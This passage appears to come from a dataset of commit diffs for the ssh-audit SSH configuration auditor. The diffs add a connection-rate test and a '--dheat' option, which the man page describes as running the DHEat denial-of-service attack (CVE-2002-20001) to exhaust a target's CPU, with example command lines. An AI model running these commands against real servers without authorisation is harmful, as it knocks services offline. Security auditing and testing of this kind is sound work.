          "--- Hunk 4 ---",
          "[Context before]",
          "111:     uout.info('                                  environment variable is set)')",
          "112:     uout.info('   -p,  --port=<port>      port to connect')",
          "113:     uout.info('   -P,  --policy=<policy.txt>  run a policy test using the specified policy')",
          "114:     uout.info('   -t,  --timeout=<secs>   timeout (in seconds) for connection and reading\\n                               (default: 5)')",
          "115:     uout.info('   -T,  --targets=<hosts.txt>  a file containing a list of target hosts (one\\n                                   per line, format HOST[:PORT]).  Use --threads\\n                                   to control concurrent scans.')",
          "116:     uout.info('        --threads=<threads>    number of threads to use when scanning multiple\\n                                   targets (-T/--targets) (default: 32)')",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "131:     uout.info('        --skip-rate-test   skip the connection rate test during standard audits\\n                               (used to safely infer whether the DHEat attack\\n                               is viable)')",
          "",
          "---------------",
          "--- Hunk 5 ---",
          "[Context before]",
          "432: # Output additional information & notes.",
          "434:     with out:",
          "435:         # Tell user that PuTTY cannot be hardened at the protocol-level.",
          "436:         if client_audit and (software is not None) and (software.product == Product.PuTTY):",
          "",
          "[Removed Lines]",
          "433: def output_info(out: OutputBuffer, software: Optional['Software'], client_audit: bool, any_problems: bool, is_json_output: bool, additional_notes: str) -> None:",
          "",
          "[Added Lines]",
          "451: def output_info(out: OutputBuffer, software: Optional['Software'], client_audit: bool, any_problems: bool, is_json_output: bool, additional_notes: List[str]) -> None:",
          "",
          "---------------",
          "--- Hunk 6 ---",
          "[Context before]",
          "441:             out.warn('(nfo) For hardening guides on common OSes, please see: <https://www.ssh-audit.com/hardening_guides.html>')",
          "443:         # Add any additional notes.",
          "447:     if not out.is_section_empty() and not is_json_output:",
          "448:         out.head('# additional info')",
          "",
          "[Removed Lines]",
          "444:         if len(additional_notes) > 0:",
          "445:             out.warn(\"(nfo) %s\" % additional_notes)",
          "",
          "[Added Lines]",
          "462:         for additional_note in additional_notes:",
          "463:             if len(additional_note) > 0:",
          "464:                 out.warn(\"(nfo) %s\" % additional_note)",
          "",
          "---------------",
          "--- Hunk 7 ---",
          "[Context before]",
          "450:         out.sep()",
          "456:     def _add_terrapin_warning(db: Dict[str, Dict[str, List[List[Optional[str]]]]], category: str, algorithm_name: str) -> None:",
          "457:         '''Adds a warning regarding the Terrapin vulnerability for the specified algorithm.'''",
          "",
          "[Removed Lines]",
          "453: def post_process_findings(banner: Optional[Banner], algs: Algorithms, client_audit: bool) -> Tuple[List[str], str]:",
          "454:     '''Perform post-processing on scan results before reporting them to the user.  Returns a list of algorithms that should not be recommended'''",
          "",
          "[Added Lines]",
          "472: def post_process_findings(banner: Optional[Banner], algs: Algorithms, client_audit: bool, dh_rate_test_notes: str) -> Tuple[List[str], List[str]]:",
          "473:     '''Perform post-processing on scan results before reporting them to the user.  Returns a list of algorithms that should not be recommended and a list of notes.'''",
          "",
          "---------------",
          "--- Hunk 8 ---",
          "[Context before]",
          "590:                 _add_terrapin_warning(db, \"mac\", mac)",
          "592:     # Return a note telling the user that, while this target is properly configured, if connected to a vulnerable peer, then a vulnerable connection is still possible.",
          "594:     if len(algs_to_note) > 0:",
          "597:     # Add the chacha ciphers, CBC ciphers, and ETM MACs to the recommendation suppression list if they are not enabled on the server.  That way they are not recommended to the user to enable if they were explicitly disabled to handle the Terrapin vulnerability.  However, they can still be recommended for disabling.",
          "598:     algorithm_recommendation_suppress_list += _get_chacha_ciphers_not_enabled(db, algs)",
          "599:     algorithm_recommendation_suppress_list += _get_cbc_ciphers_not_enabled(db, algs)",
          "600:     algorithm_recommendation_suppress_list += _get_etm_macs_not_enabled(db, algs)",
          "605: # Returns a exitcodes.* flag to denote if any failures or warnings were encountered.",
          "608:     program_retval = exitcodes.GOOD",
          "609:     client_audit = client_host is not None  # If set, this is a client audit.",
          "",
          "[Removed Lines]",
          "593:     notes = \"\"",
          "595:         notes = \"Be aware that, while this target properly supports the strict key exchange method (via the kex-strict-?-v00@openssh.com marker) needed to protect against the Terrapin vulnerability (CVE-2023-48795), all peers must also support this feature as well, otherwise the vulnerability will still be present.  The following algorithms would allow an unpatched peer to create vulnerable SSH channels with this target: %s.  If any CBC ciphers are in this list, you may remove them while leaving the *-etm@openssh.com MACs in place; these MACs are fine while paired with non-CBC cipher types.\" % \", \".join(algs_to_note)",
          "602:     return algorithm_recommendation_suppress_list, notes",
          "606: def output(out: OutputBuffer, aconf: AuditConf, banner: Optional[Banner], header: List[str], client_host: Optional[str] = None, kex: Optional[SSH2_Kex] = None, pkm: Optional[SSH1_PublicKeyMessage] = None, print_target: bool = False) -> int:",
          "",
          "[Added Lines]",
          "612:     additional_notes = []",
          "614:         additional_notes.append(\"Be aware that, while this target properly supports the strict key exchange method (via the kex-strict-?-v00@openssh.com marker) needed to protect against the Terrapin vulnerability (CVE-2023-48795), all peers must also support this feature as well, otherwise the vulnerability will still be present.  The following algorithms would allow an unpatched peer to create vulnerable SSH channels with this target: %s.  If any CBC ciphers are in this list, you may remove them while leaving the *-etm@openssh.com MACs in place; these MACs are fine while paired with non-CBC cipher types.\" % \", \".join(algs_to_note))",
          "621:     # Append any notes related to the DH rate test.",
          "622:     if len(dh_rate_test_notes) > 0:",
          "623:         additional_notes.append(dh_rate_test_notes)",
          "625:     return algorithm_recommendation_suppress_list, additional_notes",
          "629: def output(out: OutputBuffer, aconf: AuditConf, banner: Optional[Banner], header: List[str], client_host: Optional[str] = None, kex: Optional[SSH2_Kex] = None, pkm: Optional[SSH1_PublicKeyMessage] = None, print_target: bool = False, dh_rate_test_notes: str = \"\") -> int:",
          "",
          "---------------",
          "--- Hunk 9 ---",
          "[Context before]",
          "611:     algs = Algorithms(pkm, kex)",
          "613:     # Perform post-processing on the findings to make final adjustments before outputting the results.",
          "616:     with out:",
          "617:         if print_target:",
          "",
          "[Removed Lines]",
          "614:     algorithm_recommendation_suppress_list, additional_notes = post_process_findings(banner, algs, client_audit)",
          "",
          "[Added Lines]",
          "637:     algorithm_recommendation_suppress_list, additional_notes = post_process_findings(banner, algs, client_audit, dh_rate_test_notes)",
          "",
          "---------------",
          "--- Hunk 10 ---",
          "[Context before]",
          "869:     try:",
          "870:         sopts = 'h1246M:p:P:jbcnvl:t:T:Lmdg:'",
          "872:         opts, args = getopt.gnu_getopt(args, sopts, lopts)",
          "873:     except getopt.GetoptError as err:",
          "874:         usage_cb(out, str(err))",
          "",
          "[Removed Lines]",
          "871:         lopts = ['help', 'ssh1', 'ssh2', 'ipv4', 'ipv6', 'make-policy=', 'port=', 'policy=', 'json', 'batch', 'client-audit', 'no-colors', 'verbose', 'level=', 'timeout=', 'targets=', 'list-policies', 'lookup=', 'threads=', 'manual', 'debug', 'gex-test=']",
          "",
          "[Added Lines]",
          "894:         lopts = ['help', 'ssh1', 'ssh2', 'ipv4', 'ipv6', 'make-policy=', 'port=', 'policy=', 'json', 'batch', 'client-audit', 'no-colors', 'verbose', 'level=', 'timeout=', 'targets=', 'list-policies', 'lookup=', 'threads=', 'manual', 'debug', 'gex-test=', 'dheat=', 'skip-rate-test', 'conn-rate-test=']",
          "",
          "---------------",
          "--- Hunk 11 ---",
          "[Context before]",
          "956:                     usage_cb(out, '{} {} {} is not valid'.format(o, bits_left_bound, bits_right_bound))",
          "958:             aconf.gex_test = a",
          "961:     if len(args) == 0 and aconf.client_audit is False and aconf.target_file is None and aconf.list_policies is False and aconf.lookup == '' and aconf.manual is False:",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "982:         elif o == '--dheat':",
          "983:             aconf.dheat = a",
          "984:         elif o == '--skip-rate-test':",
          "985:             aconf.skip_rate_test = True",
          "986:         elif o == '--conn-rate-test':",
          "987:             aconf.conn_rate_test = a",
          "",
          "---------------",
          "--- Hunk 12 ---",
          "[Context before]",
          "1039:     return aconf",
          "1044:     def fetch_notes(algorithm: str, alg_type: str) -> Dict[str, List[Optional[str]]]:",
          "1045:         '''Returns a dictionary containing the messages in the \"fail\", \"warn\", and \"info\" levels for this algorithm.'''",
          "",
          "[Removed Lines]",
          "1042: def build_struct(target_host: str, banner: Optional['Banner'], cves: List[Dict[str, Union[str, float]]], kex: Optional['SSH2_Kex'] = None, pkm: Optional['SSH1_PublicKeyMessage'] = None, client_host: Optional[str] = None, software: Optional[Software] = None, algorithms: Optional[Algorithms] = None, algorithm_recommendation_suppress_list: Optional[List[str]] = None, additional_notes: str = \"\") -> Any:  # pylint: disable=too-many-arguments",
          "",
          "[Added Lines]",
          "1071: def build_struct(target_host: str, banner: Optional['Banner'], cves: List[Dict[str, Union[str, float]]], kex: Optional['SSH2_Kex'] = None, pkm: Optional['SSH1_PublicKeyMessage'] = None, client_host: Optional[str] = None, software: Optional[Software] = None, algorithms: Optional[Algorithms] = None, algorithm_recommendation_suppress_list: Optional[List[str]] = None, additional_notes: List[str] = []) -> Any:  # pylint: disable=dangerous-default-value",
          "",
          "---------------",
          "--- Hunk 13 ---",
          "[Context before]",
          "1207:     # Add in the recommendations.",
          "1208:     res['recommendations'] = get_algorithm_recommendations(algorithms, algorithm_recommendation_suppress_list, software, for_server=True)",
          "1213:     return res",
          "",
          "[Removed Lines]",
          "1210:     # Add in the additional notes.  Currently just one string, but in the future this may grow to multiple strings.  Hence, an array is needed to prevent future schema breakage.",
          "1211:     res['additional_notes'] = [additional_notes]",
          "",
          "[Added Lines]",
          "1239:     # Add in the additional notes.",
          "1240:     res['additional_notes'] = additional_notes",
          "",
          "---------------",
          "--- Hunk 14 ---",
          "[Context before]",
          "1290:             out.fail(\"Failed to parse server's kex.  Stack trace:\\n%s\" % str(traceback.format_exc()))",
          "1291:             return exitcodes.CONNECTION_ERROR",
          "1293:         if aconf.client_audit is False:",
          "1294:             HostKeyTest.run(out, s, kex)",
          "1295:             if aconf.gex_test != '':",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1322:         if aconf.dheat is not None:",
          "1323:             DHEat(out, aconf, banner, kex).run()",
          "1324:             return exitcodes.GOOD",
          "1325:         elif aconf.conn_rate_test_enabled:",
          "1326:             DHEat.dh_rate_test(out, aconf, kex, 0, 0, 0)",
          "1327:             return exitcodes.GOOD",
          "1329:         dh_rate_test_notes = \"\"",
          "",
          "---------------",
          "--- Hunk 15 ---",
          "[Context before]",
          "1297:             else:",
          "1298:                 GEXTest.run(out, s, banner, kex)",
          "1300:         # This is a standard audit scan.",
          "1301:         if (aconf.policy is None) and (aconf.make_policy is False):",
          "1304:         # This is a policy test.",
          "1305:         elif (aconf.policy is not None) and (aconf.make_policy is False):",
          "",
          "[Removed Lines]",
          "1302:             program_retval = output(out, aconf, banner, header, client_host=s.client_host, kex=kex, print_target=print_target)",
          "",
          "[Added Lines]",
          "1337:                 # Skip the rate test if the user specified \"--skip-rate-test\".",
          "1338:                 if aconf.skip_rate_test:",
          "1339:                     out.d(\"Skipping rate test due to --skip-rate-test option.\")",
          "1340:                 else:",
          "1341:                     # Try to open many TCP connections against the server if any Diffie-Hellman key exchanges are present; this tests potential vulnerability to the DHEat DOS attack.  Use 3 concurrent sockets over at most 1.5 seconds to open at most 38 connections (stops if 1.5 seconds elapse, or 38 connections are opened--whichever comes first).  If more than 25 connections per second were observed, flag the DH algorithms with a warning about the DHEat DOS vuln.",
          "1342:                     dh_rate_test_notes = DHEat.dh_rate_test(out, aconf, kex, 1.5, 38, 3)",
          "1346:             program_retval = output(out, aconf, banner, header, client_host=s.client_host, kex=kex, print_target=print_target, dh_rate_test_notes=dh_rate_test_notes)",
          "",
          "---------------",
          "--- Hunk 16 ---",
          "[Context before]",
          "1590: if __name__ == '__main__':  # pragma: nocover",
          "1593:     try:",
          "1594:         exit_code = main()",
          "1595:     except Exception:",
          "",
          "[Removed Lines]",
          "1591:     exit_code = exitcodes.GOOD",
          "",
          "[Added Lines]",
          "1635:     multiprocessing.freeze_support()  # Needed for PyInstaller (Windows) builds.",
          "1637:     exit_code = exitcodes.GOOD",
          "",
          "---------------"
        ],
        "ssh-audit.1||ssh-audit.1": [
          "File: ssh-audit.1 -> ssh-audit.1",
          "--- Hunk 1 ---",
          "[Context before]",
          "2: .SH NAME",
          "3: \\fBssh-audit\\fP \\- SSH server & client configuration auditor",
          "4: .SH SYNOPSIS",
          "",
          "[Removed Lines]",
          "1: .TH SSH-AUDIT 1 \"March 14, 2024\"",
          "",
          "[Added Lines]",
          "1: .TH SSH-AUDIT 1 \"April 18, 2024\"",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "46: .br",
          "47: Starts a server on port 2222 to audit client software configuration.  Use -p/--port=<port> to change port and -t/--timeout=<secs> to change listen timeout.",
          "49: .TP",
          "50: .B -d, \\-\\-debug",
          "51: .br",
          "52: Enable debug output.",
          "54: .TP",
          "55: .B -g, \\-\\-gex-test=<x[,y,...] | min1:pref1:max1[,min2:pref2:max2,...] | x-y[:step]>",
          "56: .br",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "49: .TP",
          "50: .B     \\-\\-conn\\-rate\\-test=N[:max_rate]",
          "51: .br",
          "52: Performs a connection rate test (useful for collecting metrics related to susceptibility of the DHEat vulnerability [CVE-2002-20001]).  A successful connection is counted when the server returns a valid SSH banner.  Testing is conducted with N concurrent sockets with an optional maximum rate of connections per second.",
          "59: .TP",
          "60: .B     \\-\\-dheat=N[:kex[:e_len]]",
          "61: .br",
          "62: Run the DHEat DoS attack (CVE-2002-20001) against the target server (which will consume all available CPU resources).  The number of concurrent sockets, N, needed to achieve this effect will be highly dependent on the CPU resources available on the target, as well as the latency between the source and target machines.  The key exchange is automatically chosen based on which would cause maximum effect, unless explicitly chosen in the second field.  Lastly, an (experimental) option allows the length in bytes of the fake e value sent to the server to be specified in the third field.  Normally, the length of e is roughly the length of the modulus of the Diffie-Hellman exchange (hence, an 8192-bit / 1024-byte value of e is sent in each connection when targeting the diffie-hellman-group18-sha512 algorithm).  Instead, it was observed that many SSH implementations accept small values, such as 4 bytes; this results in a much more network-efficient attack.",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "126: .br",
          "127: Runs a policy audit against a target using the specified policy (see \\fBPOLICY AUDIT\\fP section for detailed description of this mode of operation).  Combine with -c/--client-audit to audit a client configuration instead of a server.  Use -L/--list-policies to list all official, built-in policies for common systems.",
          "129: .TP",
          "130: .B -t, \\-\\-timeout=<secs>",
          "131: .br",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "139: .TP",
          "140: .B     \\-\\-skip\\-rate\\-test",
          "141: .br",
          "142: Skips the connection rate test during standard audits.  By default, a few dozen TCP connections are created with the target host to see if connection throttling is implemented (this can safely infer whether the target is vulnerable to the DHEat attack; see CVE-2002-20001).",
          "",
          "---------------",
          "--- Hunk 4 ---",
          "[Context before]",
          "273: .fi",
          "274: .RE",
          "276: .SH RETURN VALUES",
          "277: When a successful connection is made and all algorithms are rated as \"good\", \\fBssh-audit\\fP returns 0.  Other possible return values are:",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "291: .LP",
          "292: To run the DHEat DoS attack (monitor the target server's CPU usage to determine the optimal number of concurrent sockets):",
          "293: .RS",
          "294: .nf",
          "295: ssh-audit targetserver --dheat=10",
          "296: .fi",
          "297: .RE",
          "299: .LP",
          "300: To run the DHEat attack and manually target the diffie-hellman-group-exchange-sha256 algorithm:",
          "301: .RS",
          "302: .nf",
          "303: ssh-audit targetserver --dheat=10:diffie-hellman-group-exchange-sha256",
          "304: .fi",
          "305: .RE",
          "307: .LP",
          "308: To run the DHEat attack and manually target the diffie-hellman-group-exchange-sha256 algorithm with a very small length of e (resulting in the same effect but without having to send large packets):",
          "309: .RS",
          "310: .nf",
          "311: ssh-audit targetserver --dheat=10:diffie-hellman-group-exchange-sha256:4",
          "312: .fi",
          "313: .RE",
          "315: .LP",
          "316: To test the number of successful connections per second that can be created with the target using 8 parallel threads (useful for detecting whether connection throttling is implemented by the target):",
          "317: .RS",
          "318: .nf",
          "319: ssh-audit targetserver --conn-rate-test=8",
          "320: .fi",
          "321: .RE",
          "323: .LP",
          "324: To use 8 parallel threads to create up to 100 connections per second with the target (useful for understanding how much CPU load is caused on the target simply from handling new connections vs excess modular exponentiation when performing the DHEat attack):",
          "325: .RS",
          "326: .nf",
          "327: ssh-audit targetserver --conn-rate-test=8:100",
          "328: .fi",
          "329: .RE",
          "",
          "---------------"
        ],
        "ssh-audit.py||ssh-audit.py": [
          "File: ssh-audit.py -> ssh-audit.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "1: #!/usr/bin/env python3",
          "2: \"\"\"src/ssh_audit/ssh_audit.py wrapper for backwards compatibility\"\"\"",
          "4: import sys",
          "5: import traceback",
          "6: from pathlib import Path",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "4: import multiprocessing",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "10: from ssh_audit.ssh_audit import main  # noqa: E402",
          "11: from ssh_audit import exitcodes  # noqa: E402",
          "",
          "[Removed Lines]",
          "13: exit_code = exitcodes.GOOD",
          "15: try:",
          "16:     exit_code = main()",
          "17: except Exception:",
          "18:     exit_code = exitcodes.UNKNOWN_ERROR",
          "19:     print(traceback.format_exc())",
          "21: sys.exit(exit_code)",
          "",
          "[Added Lines]",
          "14: if __name__ == \"__main__\":",
          "15:     multiprocessing.freeze_support()  # Needed for PyInstaller (Windows) builds.",
          "17:     exit_code = exitcodes.GOOD",
          "18:     try:",
          "19:         exit_code = main()",
          "20:     except Exception:",
          "21:         exit_code = exitcodes.UNKNOWN_ERROR",
          "22:         print(traceback.format_exc())",
          "24:     sys.exit(exit_code)",
          "",
          "---------------"
        ],
        "test/conftest.py||test/conftest.py": [
          "File: test/conftest.py -> test/conftest.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "73:         self.rdata = []",
          "74:         self.sdata = []",
          "75:         self.errors = {}",
          "76:         self.gsock = _VirtualGlobalSocket(self)",
          "78:     def _check_err(self, method):",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "76:         self.blocking = False",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "83:     def connect(self, address):",
          "84:         return self._connect(address, False)",
          "86:     def _connect(self, address, ret=True):",
          "87:         self.peer_address = address",
          "88:         self._connected = True",
          "89:         self._check_err('connect')",
          "90:         return self if ret else None",
          "92:     def settimeout(self, timeout):",
          "93:         self.timeout = timeout",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "87:     def connect_ex(self, address):",
          "88:         return self.connect(address)",
          "96:     def setblocking(self, r: bool):",
          "97:         self.blocking = r",
          "",
          "---------------"
        ],
        "test/test_dheater.py||test/test_dheater.py": [
          "File: test/test_dheater.py -> test/test_dheater.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: import pytest",
          "3: from ssh_audit.ssh2_kexdb import SSH2_KexDB",
          "4: from ssh_audit.dheat import DHEat",
          "7: class TestDHEat:",
          "9:     @pytest.fixture(autouse=True)",
          "10:     def init(self):",
          "11:         self.SSH2_KexDB = SSH2_KexDB",
          "12:         self.DHEat = DHEat",
          "14:     def test_kex_definition_completeness(self):",
          "15:         alg_db = self.SSH2_KexDB.get_db()",
          "16:         kex_db = alg_db['kex']",
          "18:         # Get all Diffie-Hellman algorithms defined in our database.",
          "19:         dh_algs = []",
          "20:         for kex in kex_db:",
          "21:             if kex.startswith('diffie-hellman-'):",
          "22:                 dh_algs.append(kex)",
          "24:         # Ensure that each DH algorithm in our database is in either DHEat's alg_priority or gex_algs list.  Also ensure that all non-group exchange algorithms are accounted for in the alg_modulus_sizes dictionary.",
          "25:         for dh_alg in dh_algs:",
          "26:             assert (dh_alg in self.DHEat.alg_priority) or (dh_alg in self.DHEat.gex_algs)",
          "28:             if dh_alg.find(\"group-exchange\") == -1:",
          "29:                 assert dh_alg in self.DHEat.alg_modulus_sizes",
          "",
          "---------------"
        ],
        "test/test_errors.py||test/test_errors.py": [
          "File: test/test_errors.py -> test/test_errors.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "17:         conf = self.AuditConf('localhost', 22)",
          "18:         conf.colors = False",
          "19:         conf.batch = True",
          "20:         return conf",
          "22:     def _audit(self, spy, conf=None, exit_expected=False):",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "20:         conf.skip_rate_test = True",
          "",
          "---------------"
        ],
        "test/test_ssh1.py||test/test_ssh1.py": [
          "File: test/test_ssh1.py -> test/test_ssh1.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "33:         conf.verbose = True",
          "34:         conf.ssh1 = True",
          "35:         conf.ssh2 = False",
          "36:         return conf",
          "38:     def _create_ssh1_packet(self, payload, valid_crc=True):",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "36:         conf.skip_rate_test = True",
          "",
          "---------------"
        ],
        "test/test_ssh2.py||test/test_ssh2.py": [
          "File: test/test_ssh2.py -> test/test_ssh2.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "32:         conf.verbose = True",
          "33:         conf.ssh1 = False",
          "34:         conf.ssh2 = True",
          "35:         return conf",
          "37:     @classmethod",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "35:         conf.skip_rate_test = True",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "c259a83782aebd6426405e3a01430cc39f59d4b7",
      "candidate_info": {
        "commit_hash": "c259a83782aebd6426405e3a01430cc39f59d4b7",
        "repo": "jtesta/ssh-audit",
        "commit_url": "https://github.com/jtesta/ssh-audit/commit/c259a83782aebd6426405e3a01430cc39f59d4b7",
        "files": [
          "README.md",
          "docker_test.sh",
          "src/ssh_audit/policy.py",
          "src/ssh_audit/ssh_audit.py",
          "test/docker/expected_results/openssh_8.0p1_builtin_policy_test1.json",
          "test/docker/expected_results/openssh_8.0p1_builtin_policy_test1.txt",
          "test/docker/expected_results/openssh_8.0p1_builtin_policy_test2.json",
          "test/docker/expected_results/openssh_8.0p1_builtin_policy_test2.txt",
          "test/docker/expected_results/openssh_8.0p1_test1.json",
          "test/docker/expected_results/openssh_8.0p1_test1.txt",
          "test/docker/expected_results/openssh_8.0p1_test2.json",
          "test/docker/expected_results/openssh_8.0p1_test2.txt",
          "test/docker/expected_results/openssh_8.0p1_test3.json",
          "test/docker/expected_results/openssh_8.0p1_test3.txt",
          "test/docker/expected_results/tinyssh_20190101_test1.json",
          "test/docker/expected_results/tinyssh_20190101_test1.txt"
        ],
        "message": "Added note that when a target is properly configured against the Terrapin vulnerability that unpatched peers may still create vulnerable connections.  Updated Ubuntu Server & Client 20.04 & 22.04 policies to include new key exchange markers related to Terrapin counter-measures.",
        "before_after_code_files": [
          "docker_test.sh||docker_test.sh",
          "src/ssh_audit/policy.py||src/ssh_audit/policy.py",
          "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py"
          ],
          "candidate": [
            "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py"
          ]
        }
      },
      "candidate_diff": {
        "docker_test.sh||docker_test.sh": [
          "File: docker_test.sh -> docker_test.sh",
          "--- Hunk 1 ---",
          "[Context before]",
          "746: echo",
          "747: run_openssh_test \"8.0p1\" \"test1\" \"${PROGRAM_RETVAL_FAILURE}\"",
          "748: run_openssh_test \"8.0p1\" \"test2\" \"${PROGRAM_RETVAL_FAILURE}\"",
          "750: echo",
          "751: run_dropbear_test \"2019.78\" \"test1\" \"-r /etc/dropbear/dropbear_rsa_host_key_1024 -r /etc/dropbear/dropbear_dss_host_key -r /etc/dropbear/dropbear_ecdsa_host_key\" 3",
          "752: echo",
          "",
          "[Removed Lines]",
          "749: run_openssh_test \"8.0p1\" \"test3\" \"${PROGRAM_RETVAL_GOOD}\"",
          "",
          "[Added Lines]",
          "749: run_openssh_test \"8.0p1\" \"test3\" \"${PROGRAM_RETVAL_WARNING}\"",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "785: run_custom_policy_test \"config2\" \"test14\" \"${PROGRAM_RETVAL_FAILURE}\"",
          "787: # Failing test for built-in OpenSSH 8.0p1 server policy (RSA host key size is 3072 instead of 4096).",
          "790: # Failing test for built-in OpenSSH 8.0p1 server policy (MACs not hardened).",
          "794: if [[ $num_failures == 0 ]]; then",
          "",
          "[Removed Lines]",
          "788: run_builtin_policy_test \"Hardened OpenSSH Server v8.0 (version 3)\" \"8.0p1\" \"test1\" \"-o HostKeyAlgorithms=rsa-sha2-512,rsa-sha2-256,ssh-ed25519 -o KexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha256 -o Ciphers=chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr -o MACs=hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,umac-128-etm@openssh.com\" \"${PROGRAM_RETVAL_FAILURE}\"",
          "791: run_builtin_policy_test \"Hardened OpenSSH Server v8.0 (version 3)\" \"8.0p1\" \"test2\" \"-o HostKeyAlgorithms=rsa-sha2-512,rsa-sha2-256,ssh-ed25519 -o KexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha256 -o Ciphers=chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr\" \"${PROGRAM_RETVAL_FAILURE}\"",
          "",
          "[Added Lines]",
          "788: run_builtin_policy_test \"Hardened OpenSSH Server v8.0 (version 4)\" \"8.0p1\" \"test1\" \"-o HostKeyAlgorithms=rsa-sha2-512,rsa-sha2-256,ssh-ed25519 -o KexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha256 -o Ciphers=chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr -o MACs=hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,umac-128-etm@openssh.com\" \"${PROGRAM_RETVAL_FAILURE}\"",
          "791: run_builtin_policy_test \"Hardened OpenSSH Server v8.0 (version 4)\" \"8.0p1\" \"test2\" \"-o HostKeyAlgorithms=rsa-sha2-512,rsa-sha2-256,ssh-ed25519 -o KexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha256 -o Ciphers=chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr\" \"${PROGRAM_RETVAL_FAILURE}\"",
          "",
          "---------------"
        ],
        "src/ssh_audit/policy.py||src/ssh_audit/policy.py": [
          "File: src/ssh_audit/policy.py -> src/ssh_audit/policy.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "48:         'Hardened Ubuntu Server 18.04 LTS (version 4)': {'version': '4', 'banner': None, 'compressions': None, 'host_keys': ['ssh-ed25519'], 'optional_host_keys': ['ssh-ed25519-cert-v01@openssh.com', 'rsa-sha2-256-cert-v01@openssh.com', 'rsa-sha2-512-cert-v01@openssh.com'], 'kex': ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha256'], 'ciphers': ['chacha20-poly1305@openssh.com', 'aes256-gcm@openssh.com', 'aes128-gcm@openssh.com', 'aes256-ctr', 'aes192-ctr', 'aes128-ctr'], 'macs': ['hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'umac-128-etm@openssh.com'], 'hostkey_sizes': {\"rsa-sha2-256-cert-v01@openssh.com\": {\"ca_key_size\": 4096, \"ca_key_type\": \"ssh-rsa\", \"hostkey_size\": 4096}, \"rsa-sha2-512-cert-v01@openssh.com\": {\"ca_key_size\": 4096, \"ca_key_type\": \"ssh-rsa\", \"hostkey_size\": 4096}, \"ssh-ed25519\": {\"hostkey_size\": 256}, \"ssh-ed25519-cert-v01@openssh.com\": {\"ca_key_size\": 256, \"ca_key_type\": \"ssh-ed25519\", \"hostkey_size\": 256}}, 'dh_modulus_sizes': {'diffie-hellman-group-exchange-sha256': 3072}, 'server_policy': True},",
          "55:         # Generic OpenSSH Server policies",
          "",
          "[Removed Lines]",
